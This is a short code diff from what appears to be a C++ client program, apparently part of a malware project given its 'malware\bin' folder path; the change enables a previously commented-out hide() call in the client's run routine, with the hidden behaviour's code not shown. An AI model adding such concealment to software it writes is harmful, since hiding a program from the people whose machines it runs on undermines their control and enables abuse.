@@ -54,7 +54,7 @@ class Client {
 
 		void run() {
 			fprintf(stderr, "Client start running with handle %d\n", connHd);
-			/*hide();*/
+			hide();
 			int test = testKey();
 			if (test == 2) {
 				string folder = "c:\\Users\\user\\Desktop\\malware\\bin\\";
